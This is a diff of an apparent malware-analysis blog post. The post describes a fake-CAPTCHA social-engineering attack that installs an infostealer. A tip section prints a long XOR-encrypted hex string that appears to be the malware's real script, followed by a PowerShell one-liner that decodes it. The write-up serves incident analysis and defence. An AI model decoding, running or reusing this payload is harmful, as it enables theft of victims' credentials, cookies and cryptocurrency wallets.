@@ -78,8 +78,6 @@ Analysis revealed that the file Erratic1Crank1Banshee1Drainpipe.enx was not pack
 
 ![](/assets/img/static2.png){: .mx-auto.d-block :}
 
-The file Erratic1Crank1Banshee1Drainpipe.enx was found to be a plaintext script used by the malware. It contains a large amount of data encrypted using XOR and other encryption techniques.
-
 The user followed the fake CAPTCHA steps as instructed, ultimately completing the attacker's intended objective.
 
 ![](/assets/img/socialengineering.png){: .mx-auto.d-block :}
@@ -94,11 +92,11 @@ A user attempted to visit myhrlink-[XXXX].com.ph by typing it into their browser
 
 This redirection mechanism led them to a malicious webpage, which displayed a fake CAPTCHA prompt. Believing it to be legitimate, the user interacted with it, unknowingly executing malicious code. 
 
-As a result, they became a victim of Lumma Stealer, an infostealer malware designed to extract sensitive data such as credentials, browser cookies, and cryptocurrency wallet information.
+As a result, they became a victim of Infostealer, an infostealer malware designed to extract sensitive data such as credentials, browser cookies, and cryptocurrency wallet information.
 
 
-**How can I quickly decrypt an encrypted script?**
-Use the logic of a programmer when we run a script even if it is encrypted we need to see what the computer reads, 
+### How can I quickly decrypt an encrypted script?
+Use the logic of a programmer when we run a script even if it is encrypted we need to see what the computer reads, Because manually decrypting a script is time consuming. If you really need to write a report faster, do this trick.
 
 ~~~
 $encrypted=[encrypted text];
@@ -106,7 +104,7 @@ $decrypted=$encrypted + [formula of encryption];
 print($decrypted);
 ~~~
 
-For example 
+For example; 
 
 {% highlight javascript linenos %}
 
@@ -119,7 +117,6 @@ Use the trick or the formula to decrypt this script faster.
 {% highlight javascript linenos %}
 
 $encryptedHex = 'ada1bca2b1aaa7b0adabaae487aca1a7af94b6aba7a1b7b7e4ece0a5edbfada2e4eca3b3a9ade493adaaf7f69b94b6aba7a1b7b7e4b8e4b3aca1b6a1e4bfe09bea8aa5a9a1e4e9a1b5e4e0a5b9edbf81bcadb0b9b9ffa2b1aaa7b0adabaae487aca1a7af8aa5a9a1ece0a5edbfada2ece0a5e4e9a1b5e4e081aab2fe91b7a1b68aa5a9a1edbf81bcadb0b9b9ffe0a5f5e4f9e4e6ada0a5b5eaa1bca1e6e8e6ada0a5b5f2f0eaa1bca1e6e8e6a5b1b0abb6b1aab7eaa1bca1e6e8e6a0b1a9b4a7a5b4eaa1bca1e6e8e6a0a1f0a0abb0eaa1bca1e6e8e6acababafa1bcb4a8abb6a1b6eaa1bca1e6e8e6ada8b7b4bdeaa1bca1e6e8e6a8abb6a0b4a1eaa1bca1e6e8e6a0aab7b4bdeaa1bca1e6e8e6b4a1b0ababa8b7eaa1bca1e6e8e6a5b1b0abb6b1aab7a7eaa1bca1e6e8e6b6a1b7abb1b6a7a1aca5a7afa1b6eaa1bca1e6e8e6a2ada8a1a9abaaeaa1bca1e6e8e6b6a1a3a9abaaeaa1bca1e6e8e6b4b6aba7a1bcb4eaa1bca1e6e8e6b4b6aba7a1bcb4f2f0eaa1bca1e6e8e6b0a7b4b2ada1b3eaa1bca1e6e8e6b0a7b4b2ada1b3f2f0eaa1bca1e6e8e694b6aba7a9abaaeaa1bca1e6e8e694b6aba7a9abaaf2f0eaa1bca1e6e8e6b2a9a9a5b4eaa1bca1e6e6b2a9a9a5b4f2f0eaa1bca1e6e8e6b4abb6b0a9abaaeaa1bca1e6e8e6b4b6aba7a1b7b7a8a5b7b7abeaa1bca1e6e8e693adb6a1b7aca5b6afeaa1bca1e6e8e682ada0a0a8a1b6e481b2a1b6bdb3aca1b6a1eaa1bca1e6e8e682ada0a0a8a1b6eaa1bca1e6e8e6ada0a5eaa1bca1e6e8e6ada0a5f2f0eaa1bca1e6e8e68da9a9b1aaadb0bd80a1a6b1a3a3a1b6eaa1bca1e6e8e693adaa80b1a9b4eaa1bca1e6e8e6bcf2f0a0a6a3eaa1bca1e6e8e6bcf7f6a0a6a3eaa1bca1e6e8e68ba8a8bd80a6a3eaa1bca1e6e8e694b6aba7a1b7b7e4e6e0a1aab2fe97bdb7b0a1a996ababb09897bdb7938b93f2f09893adaaa0abb3b794abb3a1b697aca1a8a898b2f5eaf498b4abb3a1b6b7aca1a8a8eaa1bca1e6e4e993adaaa0abb397b0bda8a1e48cada0a0a1aae4e985b6a3b1a9a1aab088adb7b0e4e3e9b3e3e8e3ace3e8e3e9a1b4e3e8e3e9a1b4e3e8e391aab6a1b7b0b6ada7b0a1a0e3e8e3e987aba9a9a5aaa0e3e8e69792e4f0a0fce4e3acb0b0b4b7feebeba8bdf5eaa0b6abb2a1a5a8a5b6a9a3aba5b0b7afadaaeab7acabb4eba7abaca1a8b4a1b6eab4aaa3e3ff9792e4a8f3b2e4e38aa1b0ea93a1a687a8ada1aab0e3ffb4abb4a0ff97a1b0e98db0a1a9e492a5b6ada5a6a8a1feeba993f6e4ece2ec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0eaececec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0ea94b78ba6aea1a7b0ea89a1b0acaba0b7b893aca1b6a1bfa4e09bea8aa5a9a1e9a7a8adafa1e3eea0a8eeb0e3b9edea8aa5a9a1edea8daab2abafa1ecec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0eaececec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0ea94b78ba6aea1a7b0ea89a1b0acaba0b7b893aca1b6a1bfa4e09bea8aa5a9a1e9a7a8adafa1e3ee87aba9eea1e3b9edea8aa5a9a1edea8daab2abafa1ece38aa1eea7b0e3e8a4e090969181e8f5ededec8392e4a8f3b2edea92a5a8b1a1edff978de492a5b6ada5a6a8a1fef5e4ecececec8392e4a993f6edea92a5a8b1a1b88389edb893aca1b6a1bfa4e09bea8aa5a9a1e9a7a8adafa1e3eeb3aaeea0eea3e3b9edea8aa5a9a1edffe2ece4ec9f97b0b6adaaa399e3e3ea8daab7a1b6b0ed9ff7f7e8f0f5e8f6f399e98eabadaae3e3edec8392e4a993f6edea92a5a8b1a1eaecec83a1b0e98db0a1a9e492a5b6ada5a6a8a1fe98f5edea92a5a8b1a1edea8daab2abafa1ecec92a5b6ada5a6a8a1e4f0a0fce4e992a5a8b1a18baaa8edede6ffe085b2be8986e4f9e4e0a1aab2fe85b4b480a5b0a5ffa2b1aaa7b0adabaae490a59d88ece080bda995b381aae8e4e08ab7aa97edbfa7b1b6a8e4e080bda995b381aae4e9abe4e08ab7aa97b9ffa2b1aaa7b0adabaae4ac89a58fb381afecedbfa2b1aaa7b0adabaae4acaf95a28fa1a9a0ece09cbe86adb68385b7edbfada2ece5ec90a1b7b0e994a5b0ace4e994a5b0ace4e08ab7aa97ededbf90a59d88e4e09cbe86adb68385b7e4e08ab7aa97b9b9b9ac89a58fb381afff'
-
 
 $decryptedString = ($encryptedHex -split '(..)' | ? { $_ } | % { [char]([Convert]::ToByte($_, 16) -bxor 196) }) -join ''
 
